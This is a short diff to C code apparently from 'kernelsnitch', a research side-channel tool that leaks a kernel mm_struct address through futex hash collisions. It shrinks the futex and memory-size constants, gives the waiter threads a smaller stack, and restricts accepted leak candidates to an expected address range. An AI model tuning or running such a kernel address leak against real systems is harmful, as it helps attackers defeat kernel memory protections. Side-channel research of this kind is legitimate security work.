@@ -24,7 +24,7 @@
 #define KS_PAGE_SIZE PAGE_SIZE
 #endif
 #ifndef APPENDED_FUTEXES
-#define APPENDED_FUTEXES 4096
+#define APPENDED_FUTEXES 512
 #endif
 #define MULITPLE 4
 #ifndef KERNELSNITCH_IDENTITY_START
@@ -35,7 +35,7 @@
 #endif
 #define IDENTITY_START KERNELSNITCH_IDENTITY_START
 #define IDENTITY_END   KERNELSNITCH_IDENTITY_END
-#define COARSE_SZ (1ULL << 30)
+#define COARSE_SZ (1ULL << 25)
 
 enum kernelsnitch_state {
     KERNELSNITCH_NOT_INIT = 0,
@@ -130,13 +130,15 @@ static void __increase(struct kernelsnitch_shared_state *ks, size_t id, size_t a
     ASSERT_pr((ks->increase_tids != NULL), "failed to allocate futex waiter ids\n");
     ks->increase_count = amount;
     ks->increase_id = id;
+    pthread_attr_t _sa; pthread_attr_init(&_sa); pthread_attr_setstacksize(&_sa,16384);
     for (size_t i = 0; i < amount; ++i) {
         struct inc_arg *inc_arg = calloc(1, sizeof(struct inc_arg));
         inc_arg->id = id;
         inc_arg->ks = ks;
-        SYSCHK(pthread_create(&ks->increase_tids[i], 0, __do_increase,
+        SYSCHK(pthread_create(&ks->increase_tids[i], &_sa, __do_increase,
                               (void *)inc_arg));
     }
+    pthread_attr_destroy(&_sa);
     WAIT();
 }
 
@@ -250,7 +252,7 @@ static void *__mm_leak(void *arg)
                     // test the mm_struct candidate
                     for (size_t i = 1; i < ks->collisions && found_hash; ++i)
                         found_hash = (futex_hash(ks->futex_addrs[0], mm_struct_candidate) == futex_hash(ks->futex_addrs[i], mm_struct_candidate));
-                    if (found_hash) {
+                    if (found_hash && mm_struct_candidate >= IDENTITY_START && mm_struct_candidate < IDENTITY_END) {
                         ks->mm_struct = mm_struct_candidate;
                         ks->found = 1;
                         break;
